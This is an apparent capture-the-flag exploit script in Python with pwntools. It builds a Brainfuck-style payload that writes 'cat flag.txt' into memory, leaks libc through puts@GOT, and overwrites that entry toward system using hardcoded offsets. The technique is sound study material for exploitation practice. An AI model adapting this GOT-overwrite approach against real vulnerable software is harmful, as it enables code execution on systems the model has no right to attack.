from pwn import *

# &data -> 0x4034e0
# &debug -> 0x4034c0
# putchar@GOT -> 0x403450
# puts@GOT -> 0x403458

# remote offset
# putchar -> e36
# puts -> 230

# references:
# https://gist.github.com/roachhd/dce54bec8ba55fb17d3a
# https://gist.github.com/ihciah/722643bbfe93207e5dbd

libc = './libc6_2.11.1-0ubuntu7.12_i386.so'
libc = '/lib/x86_64-linux-gnu/libc.so.6'
libc = ELF(libc, checksec=False)
start = 0x0401090

payload = b'' # start at &data
    
# write 'cat flag.txt'
data = 'cat flag.txt'
for i in data:
    payload += b'+' * ord(i)
    payload += b'>'
payload += b'<' * len(data) # points to &data

# leaking libc
# libc6_2.11.1-0ubuntu7.12_i386 
payload += b'<' * 136    # point to puts@GOT
payload += b'.>' * 6 
payload += b'<' * 6     # point to puts@GOT

# overwrite puts to system
# local puts offset   -> 0x75b00
# local system offset -> 0x4c920
payload += b'+' * 0x20 + b'>'
payload += b'-' * 0x92 + b'>'
payload += b'-' * 0x2
payload += b'<' * 2     # point to puts@GOT

# enable debug mode
payload += b'>' * 104   # point to &debug
payload += b'+' * 1     # enable debug

f = open("payload", "wb+")
f.write(payload)
f.close()